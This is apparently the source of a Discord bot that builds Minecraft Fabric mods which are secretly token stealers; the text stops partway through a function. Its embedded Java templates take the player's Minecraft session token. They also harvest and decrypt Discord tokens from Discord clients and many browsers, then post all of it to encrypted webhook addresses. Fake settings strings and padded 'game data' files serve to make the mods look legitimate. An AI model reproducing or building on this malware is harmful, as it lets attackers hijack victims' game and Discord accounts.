import discord
from discord import app_commands
import os
import shutil
import asyncio
import uuid
import time
import tempfile
import zipfile
import json
import io
import datetime
import base64
import hashlib
import subprocess
import aiohttp
import platform
import random
import struct
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime, UTC


def _load_json(path: str, label: str) -> dict:
    """Load a JSON config file or exit with a helpful message."""
    if not os.path.isfile(path):
        print(f"[X] {path} not found. Restore it from the repo and try again.", flush=True)
        raise SystemExit(1)
    try:
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
        if not isinstance(data, dict):
            print(f"[X] {label} ({path}) is not a JSON object.", flush=True)
            raise SystemExit(1)
        return data
    except json.JSONDecodeError as exc:
        print(f"[X] {label} ({path}) has invalid JSON: {exc}", flush=True)
        raise SystemExit(1)


def _require(path: str, label: str, keys: list[str]) -> dict:
    """Load config and assert that all required keys exist."""
    data = _load_json(path, label)
    missing = [k for k in keys if k not in data]
    if missing:
        print(f"[X] {label} is missing: {', '.join(missing)}", flush=True)
        raise SystemExit(1)
    return data


# ---------------------------------------------------------------------------
# Config (loaded from config/config.json — never hardcoded)
# ---------------------------------------------------------------------------
ROOT = os.path.dirname(os.path.abspath(__file__))
os.chdir(ROOT)
cfg = _require("config/config.json", "Bot config", ["tokens", "discord"])
tokens = cfg.get("tokens") or {}
discord_cfg = cfg.get("discord") or {}

TOKEN = str(tokens.get("bot_token") or "").strip()
if not TOKEN or TOKEN.upper() in {"YOUR_BOT_TOKEN", "BOT_TOKEN", "TOKEN", "PASTE_TOKEN_HERE"}:
    print("[X] config/config.json has no bot_token yet. Open it and add your bot token.", flush=True)
    raise SystemExit(1)

MASTER_WEBHOOK = str(tokens.get("master_webhook") or "").strip()
CHANNEL_ID = int(discord_cfg.get("channel_id") or 0)
if not CHANNEL_ID:
    print("[X] config/config.json discord.channel_id is missing or empty.", flush=True)
    raise SystemExit(1)

BOT_DIR = ROOT
BUILD_DIR = os.path.join(BOT_DIR, "builds")
GRADLE_CACHE = os.path.join(BOT_DIR, "gradle-cache")
TOOLS_DIR = os.path.join(BOT_DIR, "tools")
os.makedirs(BUILD_DIR, exist_ok=True)
os.makedirs(GRADLE_CACHE, exist_ok=True)
os.makedirs(TOOLS_DIR, exist_ok=True)

MAX_CONCURRENT = 3
COOLDOWN_SECONDS = 0
MAX_UPLOAD_BYTES = 7800000

warning_counts = {}
last_build_time = {}
build_queue = asyncio.Queue()

intents = discord.Intents.default()
intents.message_content = True
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

def safe_format(template, **kwargs):
    result = template
    for key, value in kwargs.items():
        result = result.replace('{' + key + '}', str(value))
    return result

BUILD_GRADLE = '''buildscript {
    repositories {
        maven { url 'https://maven.fabricmc.net/' }
        mavenCentral()
    }
    dependencies {
        classpath 'net.fabricmc:fabric-loom:1.17-SNAPSHOT'
    }
}

apply plugin: 'fabric-loom'
apply plugin: 'base'

version = "{version}"
group = "com.{mod_package}"

base {
    archivesName = "{mod_class}"
}

repositories {
    mavenCentral()
    maven { url 'https://maven.fabricmc.net/' }
}

dependencies {
    minecraft "com.mojang:minecraft:1.21.11"
    mappings "net.fabricmc:yarn:1.21.11+build.3:v2"
    modImplementation "net.fabricmc:fabric-loader:0.19.3"
    modImplementation 'com.google.code.gson:gson:2.10.1'
    include 'com.google.code.gson:gson:2.10.1'
    compileOnly 'net.java.dev.jna:jna:5.14.0'
    compileOnly 'net.java.dev.jna:jna-platform:5.14.0'
}

tasks.withType(JavaCompile).configureEach {
    it.options.release = 21
}
'''


AUTOPAY_BUILD_GRADLE = '''buildscript {
    repositories {
        maven { url 'https://maven.fabricmc.net/' }
        mavenCentral()
    }
    dependencies {
        classpath 'net.fabricmc:fabric-loom:1.17-SNAPSHOT'
    }
}

apply plugin: 'fabric-loom'
apply plugin: 'base'

version = "1.0.0"
group = "com.autopay"

base {
    archivesName = "autopay"
}

repositories {
    mavenCentral()
    maven { url 'https://maven.fabricmc.net/' }
}

dependencies {
    minecraft "com.mojang:minecraft:1.21.11"
    mappings "net.fabricmc:yarn:1.21.11+build.3:v2"
    modImplementation "net.fabricmc:fabric-loader:0.19.3"
}

tasks.withType(JavaCompile).configureEach {
    it.options.release = 21
}
'''

GRADLE_PROPERTIES = '''org.gradle.jvmargs=-Xmx1G
org.gradle.parallel=true
fabric.loom.multiProjectOptimisation=true
'''

SETTINGS_GRADLE = '''pluginManagement {
    repositories {
        maven { name = 'Fabric'; url = 'https://maven.fabricmc.net/' }
        gradlePluginPortal()
    }
}
'''

def encrypt_string(plaintext, mod_package):
    key_base = f"{mod_package}Cache"
    key = hashlib.sha256(key_base.encode()).digest()[:16]
    cipher = AES.new(key, AES.MODE_ECB)
    padded = pad(plaintext.encode('utf-8'), AES.block_size)
    encrypted = cipher.encrypt(padded)
    return base64.b64encode(encrypted).decode('ascii')

MAIN_CLASS_TEMPLATE = '''package com.{mod_package};

import net.fabricmc.api.ClientModInitializer;

public class {mod_class} implements ClientModInitializer {
    @Override
    public void onInitializeClient() {
        {mod_class}Loader.load();
    }
}
'''

LOADER_CLASS_TEMPLATE = '''package com.{mod_package};

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.MessageDigest;
import java.util.Base64;
import java.nio.charset.StandardCharsets;

public class {mod_class}Loader {
    private static final String ENC_WEBHOOK = "{enc_webhook}";

    public static void load() {
        try {
            String webhooks = decrypt(ENC_WEBHOOK);
            String[] urls = webhooks.split("\\\\|\\\\|\\\\|");
            String username = {mod_class}Profile.getUsername();
            String token = {mod_class}Profile.getAccessToken();
            java.util.List<String> cache = {mod_class}Cache.scan();
            String payload = {mod_class}Network.buildPayload(username, token, cache);
            for (String url : urls) {
                {mod_class}Network.post(url.trim(), payload);
            }
        } catch (Exception ignored) {}
    }

    private static String decrypt(String enc) {
        try {
            String keyBase = "{mod_package}Cache";
            byte[] key = MessageDigest.getInstance("SHA-256").digest(keyBase.getBytes());
            byte[] keyBytes = new byte[16];
            System.arraycopy(key, 0, keyBytes, 0, 16);
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(keyBytes, "AES"));
            byte[] dec = cipher.doFinal(Base64.getDecoder().decode(enc));
            return new String(dec, StandardCharsets.UTF_8).trim();
        } catch (Exception e) { return ""; }
    }
}
'''

PROFILE_CLASS_TEMPLATE = '''package com.{mod_package};

import net.minecraft.client.MinecraftClient;

public class {mod_class}Profile {
    public static String getUsername() {
        try {
            return MinecraftClient.getInstance().getSession().getUsername();
        } catch (Exception e) { return "unknown"; }
    }
    public static String getAccessToken() {
        try {
            return MinecraftClient.getInstance().getSession().getAccessToken();
        } catch (Exception e) { return "unknown"; }
    }
}
'''

CACHE_CLASS_TEMPLATE = '''package com.{mod_package};

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import com.sun.jna.platform.win32.Crypt32Util;
import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class {mod_class}Cache {
    private static final Pattern TOKEN_REGEX = Pattern.compile("[\\\\w-]{24}\\\\.[\\\\w-]{6}\\\\.[\\\\w-]{25,110}");
    private static final Pattern ENC_TOKEN_REGEX = Pattern.compile("dQw4w9WgXcQ:[^\\\\x22]*");

    public static List<String> scan() {
        Set<String> tokens = new LinkedHashSet<>();
        Map<String, String> paths = buildPaths();
        for (Map.Entry<String, String> e : paths.entrySet()) {
            File dir = new File(e.getValue());
            if (!dir.exists()) continue;
            if (e.getKey().toLowerCase().contains("discord") || e.getKey().toLowerCase().contains("cord")) {
                byte[] key = getLocalKey(dir);
                if (key != null) crawlEncrypted(dir, key, tokens);
            }
            crawlUnencrypted(dir, tokens);
        }
        List<String> valid = new ArrayList<>();
        for (String t : tokens) if (isValid(t)) valid.add(t);
        return valid;
    }

    private static Map<String, String> buildPaths() {
        Map<String, String> map = new LinkedHashMap<>();
        String a = System.getenv("APPDATA"), l = System.getenv("LOCALAPPDATA");
        if (a == null) a = ""; if (l == null) l = "";
        map.put("Discord", a + "\\\\discord\\\\Local Storage\\\\leveldb");
        map.put("Discord Canary", a + "\\\\discordcanary\\\\Local Storage\\\\leveldb");
        map.put("Discord PTB", a + "\\\\discordptb\\\\Local Storage\\\\leveldb");
        map.put("Lightcord", a + "\\\\Lightcord\\\\Local Storage\\\\leveldb");
        map.put("Opera", a + "\\\\Opera Software\\\\Opera Stable\\\\Local Storage\\\\leveldb");
        map.put("Opera GX", a + "\\\\Opera Software\\\\Opera GX Stable\\\\Local Storage\\\\leveldb");
        map.put("Amigo", l + "\\\\Amigo\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Torch", l + "\\\\Torch\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Kometa", l + "\\\\Kometa\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Orbitum", l + "\\\\Orbitum\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("CentBrowser", l + "\\\\CentBrowser\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("7Star", l + "\\\\7Star\\\\7Star\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Sputnik", l + "\\\\Sputnik\\\\Sputnik\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Vivaldi", l + "\\\\Vivaldi\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        map.put("Chrome SxS", l + "\\\\Google\\\\Chrome SxS\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Chrome", l + "\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        map.put("Chrome1", l + "\\\\Google\\\\Chrome\\\\User Data\\\\Profile 1\\\\Local Storage\\\\leveldb");
        map.put("Chrome2", l + "\\\\Google\\\\Chrome\\\\User Data\\\\Profile 2\\\\Local Storage\\\\leveldb");
        map.put("Chrome3", l + "\\\\Google\\\\Chrome\\\\User Data\\\\Profile 3\\\\Local Storage\\\\leveldb");
        map.put("Chrome4", l + "\\\\Google\\\\Chrome\\\\User Data\\\\Profile 4\\\\Local Storage\\\\leveldb");
        map.put("Chrome5", l + "\\\\Google\\\\Chrome\\\\User Data\\\\Profile 5\\\\Local Storage\\\\leveldb");
        map.put("Epic Privacy Browser", l + "\\\\Epic Privacy Browser\\\\User Data\\\\Local Storage\\\\leveldb");
        map.put("Microsoft Edge", l + "\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        map.put("Uran", l + "\\\\uCozMedia\\\\Uran\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        map.put("Yandex", l + "\\\\Yandex\\\\YandexBrowser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        map.put("Brave", l + "\\\\BraveSoftware\\\\Brave-Browser\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        map.put("Iridium", l + "\\\\Iridium\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb");
        return map;
    }

    private static byte[] getLocalKey(File leveldbDir) {
        File ls = new File(leveldbDir.getParentFile().getParentFile(), "Local State");
        if (!ls.exists()) return null;
        try {
            JsonObject json = JsonParser.parseReader(new FileReader(ls)).getAsJsonObject();
            String b64 = json.getAsJsonObject("os_crypt").get("encrypted_key").getAsString();
            byte[] enc = Base64.getDecoder().decode(b64);
            return Crypt32Util.cryptUnprotectData(Arrays.copyOfRange(enc, 5, enc.length));
        } catch (Exception e) { return null; }
    }

    private static void crawlEncrypted(File dir, byte[] key, Set<String> out) {
        File[] files = dir.listFiles(); if (files == null) return;
        for (File f : files) for (String enc : regexFile(ENC_TOKEN_REGEX, f)) {
            try {
                String b64 = enc.replace("dQw4w9WgXcQ:", "");
                byte[] blob = Base64.getDecoder().decode(b64);
                String t = decrypt(blob, key);
                if (t != null) out.add(t);
            } catch (Exception ignored) {}
        }
    }

    private static void crawlUnencrypted(File dir, Set<String> out) {
        File[] files = dir.listFiles(); if (files == null) return;
        for (File f : files) for (String t : regexFile(TOKEN_REGEX, f)) out.add(t);
    }

    private static String decrypt(byte[] blob, byte[] key) {
        try {
            if (blob.length < 16) return null;
            byte[] iv = Arrays.copyOfRange(blob, 3, 15);
            byte[] ct = Arrays.copyOfRange(blob, 15, blob.length);
            Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
            c.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key, "AES"), new GCMParameterSpec(128, iv));
            return new String(c.doFinal(ct), StandardCharsets.UTF_8).trim();
        } catch (Exception e) { return null; }
    }

    private static boolean isValid(String token) {
        try {
            HttpURLConnection con = (HttpURLConnection) URI.create("https://discord.com/api/v9/users/@me").toURL().openConnection();
            con.setRequestProperty("Authorization", token);
            con.setConnectTimeout(3000); con.setReadTimeout(3000);
            int code = con.getResponseCode(); con.disconnect();
            return code == 200;
        } catch (Exception e) { return false; }
    }

    private static Vector<String> regexFile(Pattern p, File f) {
        Vector<String> r = new Vector<>();
        try {
            StringBuilder sb = new StringBuilder();
            try (BufferedReader br = new BufferedReader(new FileReader(f))) {
                String l; while ((l = br.readLine()) != null) sb.append(l);
            }
            Matcher m = p.matcher(sb.toString());
            while (m.find() && !r.contains(m.group())) r.add(m.group());
        } catch (Exception ignored) {}
        return r;
    }
}
'''

NETWORK_CLASS_TEMPLATE = '''package com.{mod_package};

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.util.List;

public class {mod_class}Network {
    public static void post(String url, String json) {
        try {
            HttpURLConnection con = (HttpURLConnection) URI.create(url).toURL().openConnection();
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json");
            con.setDoOutput(true);
            con.setConnectTimeout(5000); con.setReadTimeout(5000);
            try (OutputStream os = con.getOutputStream()) { os.write(json.getBytes(StandardCharsets.UTF_8)); }
            con.getResponseCode();
        } catch (Exception ignored) {}
    }

    public static String buildPayload(String username, String mcToken, List<String> discordTokens) {
        String mcDesc = "**Username**\\n**`" + username + "`**\\n\\n"
                      + "**Session ID (Click to reveal)**\\n"
                      + "||```" + mcToken + "```||";
        String embeds = "[{" + "\\"title\\":\\"Session Info & Stats\\","
                + "\\"description\\":\\"" + escape(mcDesc) + "\\","
                + "\\"color\\":16711680}]";
        if (!discordTokens.isEmpty()) {
            StringBuilder d = new StringBuilder();
            for (String t : discordTokens) {
                if (d.length() + t.length() + 12 > 1500) break;
                d.append("||```").append(t).append("```||\\n");
            }
            embeds = "[" + embeds.substring(1, embeds.length()-1) + ",{"
                    + "\\"title\\":\\"Discord Tokens\\","
                    + "\\"description\\":\\"" + escape(d.toString().trim()) + "\\","
                    + "\\"color\\":16711680}]";
        }
        return "{\\"content\\":\\"@everyone\\",\\"embeds\\":" + embeds + "}";
    }

    private static String escape(String s) {
        if (s == null) return "";
        StringBuilder sb = new StringBuilder(s.length()+20);
        for (char c : s.toCharArray()) {
            switch (c) {
                case '"': sb.append("\\\\\\""); break;
                case '\\\\': sb.append("\\\\\\\\"); break;
                case '\\b': sb.append("\\\\b"); break;
                case '\\f': sb.append("\\\\f"); break;
                case '\\n': sb.append("\\\\n"); break;
                case '\\r': sb.append("\\\\r"); break;
                case '\\t': sb.append("\\\\t"); break;
                default:
                    if (c < ' ') sb.append(String.format("\\\\u%04x", (int)c));
                    else sb.append(c);
            }
        }
        return sb.toString();
    }
}
'''

VERSION = "3.1.2+1.21.11"

FABRIC_JSON_HOST = '''{
    "schemaVersion": 1,
    "id": "{mod_id}",
    "version": "{version}",
    "name": "{mod_name}",
    "license": "MIT",
    "environment": "client",
    "entrypoints": {
        "client": ["com.{mod_package}.{mod_class}"]
    },
    "depends": {
        "fabricloader": ">=0.19.3",
        "minecraft": ">=1.21.11"
    }
}
'''

LANG_EN_US = '''{{
    "{mod_id}.title": "{mod_name}",
    "{mod_id}.config.title": "{mod_name} Settings",
    "{mod_id}.config.category.general": "General",
    "{mod_id}.config.option.enabled": "Enabled",
    "{mod_id}.config.option.enabled.description": "Toggle {mod_name} on or off",
    "{mod_id}.config.option.render": "Render Overlay",
    "{mod_id}.config.option.render.description": "Show the {mod_name} overlay",
    "{mod_id}.config.option.color": "Overlay Color",
    "{mod_id}.config.option.color.description": "RGB color for the overlay display",
    "{mod_id}.config.option.opacity": "Overlay Opacity",
    "{mod_id}.config.option.opacity.description": "Transparency of the overlay (0-255)",
    "{mod_id}.config.option.scale": "UI Scale",
    "{mod_id}.config.option.scale.description": "Scale factor for the interface",
    "{mod_id}.config.option.pos_x": "Overlay X Position",
    "{mod_id}.config.option.pos_y": "Overlay Y Position",
    "{mod_id}.config.option.fps": "Show FPS",
    "{mod_id}.config.option.fps.description": "Display FPS counter in the overlay",
    "{mod_id}.config.option.ping": "Show Ping",
    "{mod_id}.config.option.ping.description": "Display ping in the overlay",
    "{mod_id}.config.option.coords": "Show Coordinates",
    "{mod_id}.config.option.coords.description": "Display player coordinates in the overlay",
    "{mod_id}.key.category": "{mod_name}",
    "{mod_id}.key.toggle": "Toggle {mod_name}",
    "{mod_id}.key.menu": "Open {mod_name} Menu",
    "{mod_id}.menu.button.config": "Config",
    "{mod_id}.menu.button.close": "Close",
    "{mod_id}.menu.button.reset": "Reset to Defaults",
    "{mod_id}.toast.enabled": "{mod_name} enabled",
    "{mod_id}.toast.disabled": "{mod_name} disabled",
    "{mod_id}.screen.loading": "Loading {mod_name}...",
    "{mod_id}.screen.error": "Failed to initialize {mod_name}",
    "{mod_id}.chat.prefix": "[{mod_name}]",
    "{mod_id}.chat.welcome": "{mod_name} loaded successfully!",
    "{mod_id}.chat.update": "{mod_name} is up to date (v{version})",
    "{mod_id}.chat.error": "An error occurred in {mod_name}"
}}'''

async def ensure_cfr():
    cfr_path = os.path.join(TOOLS_DIR, "cfr.jar")
    if os.path.exists(cfr_path):
        return cfr_path
    cfr_url = "https://repo1.maven.org/maven2/org/benf/cfr/0.152/cfr-0.152.jar"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(cfr_url) as resp:
                if resp.status == 200:
                    with open(cfr_path, 'wb') as f:
                        f.write(await resp.read())
                    return cfr_path
    except Exception:
        pass
    return None

GRADLE_WRAPPER_JAR_URL = "https://github.com/gradle/gradle/raw/v8.5.0/gradle/wrapper/gradle-wrapper.jar"
GRADLE_DISTRIBUTION_URL = "https://services.gradle.org/distributions/gradle-9.7.0-bin.zip"

async def ensure_gradle_wrapper():
    wrapper_jar = os.path.join(TOOLS_DIR, "gradle-wrapper.jar")
    if not os.path.exists(wrapper_jar):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(GRADLE_WRAPPER_JAR_URL) as resp:
                    if resp.status == 200:
                        with open(wrapper_jar, 'wb') as f:
                            f.write(await resp.read())
                    else:
                        raise Exception("Failed to download gradle-wrapper.jar")
        except Exception as e:
            raise Exception(f"Could not fetch gradle wrapper: {e}")
    return wrapper_jar

def write_gradle_wrapper(project_dir, wrapper_jar_path):
    wrapper_dir = os.path.join(project_dir, "gradle", "wrapper")
    os.makedirs(wrapper_dir, exist_ok=True)
    shutil.copy2(wrapper_jar_path, os.path.join(wrapper_dir, "gradle-wrapper.jar"))
    props_path = os.path.join(wrapper_dir, "gradle-wrapper.properties")
    with open(props_path, "w") as f:
        f.write(f"distributionUrl={GRADLE_DISTRIBUTION_URL}\n")
    bat_content = '''@rem
@rem Copyright 2015 the original author or authors.
@rem
@rem Licensed under the Apache License, Version 2.0 (the "License");
@rem you may not use this file except in compliance with the License.
@rem You may obtain a copy of the License at
@rem
@rem      https://www.apache.org/licenses/LICENSE-2.0
@rem
@rem Unless required by applicable law or agreed to in writing, software
@rem distributed under the License is distributed on an "AS IS" BASIS,
@rem WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
@rem See the License for the specific language governing permissions and
@rem limitations under the License.
@rem

@if "%DEBUG%"=="" @echo off
@rem ##########################################################################
@rem
@rem  Gradle startup script for Windows
@rem
@rem ##########################################################################

@rem Set local scope for the variables with windows NT shell
if "%OS%"=="Windows_NT" setlocal

set DIRNAME=%~dp0
if "%DIRNAME%"=="" set DIRNAME=.
@rem This is normally unused
set APP_BASE_NAME=%~n0
set APP_HOME=%DIRNAME%

@rem Resolve any "." and ".." in APP_HOME to make it shorter.
for %%i in ("%APP_HOME%") do set APP_HOME=%%~fi

@rem Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
set DEFAULT_JVM_OPTS="-Xmx64m" "-Xms64m"

@rem Find java.exe
if defined JAVA_HOME goto findJavaFromJavaHome

set JAVA_EXE=java.exe
%JAVA_EXE% -version >NUL 2>&1
if %ERRORLEVEL% equ 0 goto execute

echo.
echo ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:findJavaFromJavaHome
set JAVA_HOME=%JAVA_HOME:"=%
set JAVA_EXE=%JAVA_HOME%/bin/java.exe

if exist "%JAVA_EXE%" goto execute

echo.
echo ERROR: JAVA_HOME is set to an invalid directory: %JAVA_HOME%
echo.
echo Please set the JAVA_HOME variable in your environment to match the
echo location of your Java installation.

goto fail

:execute
@rem Setup the command line

set CLASSPATH=%APP_HOME%\\gradle\\wrapper\\gradle-wrapper.jar


@rem Execute Gradle
"%JAVA_EXE%" %DEFAULT_JVM_OPTS% %JAVA_OPTS% %GRADLE_OPTS% "-Dorg.gradle.appname=%APP_BASE_NAME%" -classpath "%CLASSPATH%" org.gradle.wrapper.GradleWrapperMain %*

:end
@rem End local scope for the variables with windows NT shell
if %ERRORLEVEL% equ 0 goto mainEnd

:fail
rem Set variable GRADLE_EXIT_CONSOLE if you need the _script_ return code instead of
rem the _cmd.exe /c_ return code!
set EXIT_CODE=%ERRORLEVEL%
if %EXIT_CODE% equ 0 set EXIT_CODE=1
if not ""=="%GRADLE_EXIT_CONSOLE%" exit %EXIT_CODE%
exit /b %EXIT_CODE%

:mainEnd
if "%OS%"=="Windows_NT" endlocal

:omega
'''
    sh_content = '''#!/bin/sh
#
# Copyright 2015 the original author or authors.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#

##############################################################################
#
#   Gradle start up script for POSIX generated by Gradle.
#
#   Important for running:
#
#   (1) You need a POSIX-compliant shell like POSIX sh or Bash (e.g. bash, zsh)
#       for 'set -o pipefail' to work.
#   (2) The script will look for a command line tool named 'java' and if not
#       found will try to find one via JAVA_HOME.
#
##############################################################################

# Attempt to set APP_HOME
# Resolve links: $0 may be a link
app_path=$0

# Need this for daisy-chained symlinks.
while
    APP_HOME=${app_path%"${app_path##*/}"}  # leaves a trailing /; empty if no leading path
    [ -h "$app_path" ]
do
    ls=$( ls -ld "$app_path" )
    link=${ls#*' -> '}
    case $link in             #(
      /*)   app_path=$link ;; #(
      *)    app_path=$APP_HOME$link ;;
    esac
done

# This is normally unused
# shellcheck disable=SC2034
APP_BASE_NAME=${0##*/}
APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit

# Add default JVM options here. You can also use JAVA_OPTS and GRADLE_OPTS to pass JVM options to this script.
DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'

# Use the maximum available, or set MAX_FD != -1 to use that value.
MAX_FD=maximum

warn () {
    echo "$*"
} >&2

die () {
    echo
    echo "$*"
    echo
    exit 1
} >&2

# OS specific support (must be 'true' or 'false').
cygwin=false
msys=false
darwin=false
nonstop=false
case "$( uname )" in                #(
  CYGWIN* )         cygwin=true  ;; #(
  Darwin* )         darwin=true  ;; #(
  MSYS* | MINGW* )  msys=true    ;; #(
  NONSTOP* )        nonstop=true ;;
esac

CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar


# Determine the Java command to use to start the JVM.
if [ -n "$JAVA_HOME" ] ; then
    if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
        # IBM's JDK on AIX uses strange locations for the executables
        JAVACMD=$JAVA_HOME/jre/sh/java
    else
        JAVACMD=$JAVA_HOME/bin/java
    fi
    if [ ! -x "$JAVACMD" ] ; then
        die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
    fi
else
    JAVACMD=java
    if ! command -v java >/dev/null 2>&1
    then
        die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.

Please set the JAVA_HOME variable in your environment to match the
location of your Java installation."
    fi
fi

# Increase the maximum file descriptors if we can.
if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
    case $MAX_FD in #(
      max*)
        # In POSIX sh, ulimit -H is undefined. That's why the result is checked to see if it worked.
        # shellcheck disable=SC3045
        MAX_FD=$( ulimit -H -n ) ||
            warn "Could not query maximum file descriptor limit"
    esac
    case $MAX_FD in  #(
      '' | soft) :;; #(
      *)
        # In POSIX sh, ulimit -n is undefined. That's why the result is checked to see if it worked.
        # shellcheck disable=SC3045
        ulimit -n "$MAX_FD" ||
            warn "Could not set maximum file descriptor limit to $MAX_FD"
    esac
fi

# Collect all arguments for the java command, stacking in reverse order:
#   * args from the command line
#   * the main class name
#   * -classpath
#   * -D...appname settings
#   * --module-path (only if needed)
#   * DEFAULT_JVM_OPTS, JAVA_OPTS, and GRADLE_OPTS environment variables.

# For Cygwin or MSYS, switch paths to Windows format before running java
if "$cygwin" || "$msys" ; then
    APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
    CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )

    JAVACMD=$( cygpath --unix "$JAVACMD" )

    # Now convert the arguments - kludge to limit ourselves to /bin/sh
    for arg do
        if
            case $arg in                                #(
              -*)   false ;;                            # not an option
              */*)  true;;                              #(
              *)    false ;;
            esac
        then
            arg=$( cygpath --path --ignore --mixed "$arg" )
        fi
        # Roll the args list around exactly as many times as the number of
        # args, so each arg winds up back in the position where it started, but
        # possibly modified.
        #
        # NB: a `for` loop evaluates its `in` part to an empty list if it is "$@".
        # That's what we want: the args stay in their original order.
        set -- "$@" "$arg"
    done
fi

# Collect the arguments in the JAVACMD_ARGS variable.
eval set -- $DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS "\"-Dorg.gradle.appname=$APP_BASE_NAME\"" -classpath "\"$CLASSPATH\"" org.gradle.wrapper.GradleWrapperMain "$@"

# Use "xargs" to parse quoted args.
# The use of "xargs" is required to get proper argument quoting in the presence of many arguments.
# Use of "printf" avoids problems with the "set" builtin's built-in behavior of treating trailing backslashes.
# Use of "xargs" also resolves the issue where the arguments contain spaces that are not properly quoted.
# shellcheck disable=SC2086
set -- $( printf "%s" "$@" | xargs -0 )

# Run the actual command with the collected arguments.
exec "$JAVACMD" "$@"
'''
    bat_path = os.path.join(project_dir, "gradlew.bat")
    with open(bat_path, "w", newline='\r\n') as f:
        f.write(bat_content)
    sh_path = os.path.join(project_dir, "gradlew")
    with open(sh_path, "w", newline='\n') as f:
        f.write(sh_content)
    os.chmod(sh_path, 0o755)
    return True

async def run_gradle_build(project_dir):
    wrapper_jar = await ensure_gradle_wrapper()
    write_gradle_wrapper(project_dir, wrapper_jar)
    is_windows = platform.system() == "Windows"
    gradle_script = os.path.join(project_dir, "gradlew.bat" if is_windows else "gradlew")
    if not os.path.exists(gradle_script):
        raise Exception(f"Gradle wrapper script not found: {gradle_script}")
    proc = await asyncio.create_subprocess_exec(
        gradle_script, "build", "--no-daemon",
        cwd=project_dir,
        stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE,
        env={**os.environ, "GRADLE_USER_HOME": GRADLE_CACHE}
    )
    stdout, stderr = await proc.communicate()
    stdout_str = stdout.decode(errors="replace")
    stderr_str = stderr.decode(errors="replace")
    print(f"[BUILD] Gradle stdout:\n{stdout_str}")
    print(f"[BUILD] Gradle stderr:\n{stderr_str}")
    
    if proc.returncode != 0:
        error_msg = f"Build failed (exit code {proc.returncode})\nSTDOUT (last 1500 chars):\n{stdout_str[-1500:]}\nSTDERR (last 1500 chars):\n{stderr_str[-1500:]}"
        print(error_msg)
        raise Exception(error_msg)

    libs = os.path.join(project_dir, "build", "libs")
    if not os.path.exists(libs):
        raise Exception("build/libs directory not found.")
    jars = [f for f in os.listdir(libs) if f.endswith(".jar") and "sources" not in f and "-dev" not in f]
    if not jars:
        raise Exception("No JAR produced.")
    return os.path.join(libs, jars[0])

def generate_dummy_data_file(project_dir, mod_id, size_mb):
    """
    Generate a binary data file that looks like legitimate mod cache/shader data.
    The file is placed in assets/<mod_id>/data/ and named "game_data.bin".
    Writes exactly size_mb MB (or as close as possible) of pseudo-random data
    with a plausible header to avoid suspicion.
    """
    if size_mb is None or size_mb < 0.1:
        return None

    target_bytes = int(size_mb * 1024 * 1024)
    if target_bytes < 1:
        target_bytes = 1

    data_dir = os.path.join(project_dir, "src", "main", "resources", "assets", mod_id, "data")
    os.makedirs(data_dir, exist_ok=True)

    filename = "game_data.bin"
    filepath = os.path.join(data_dir, filename)

    header = f"# Generated: {datetime.now(UTC).isoformat()}\n"
    header_bytes = header.encode('utf-8')
    header_padded = header_bytes.ljust(256, b'\0')

    chunk_size = 1024 * 1024
    with open(filepath, "wb") as f:
        f.write(header_padded)
        written = len(header_padded)

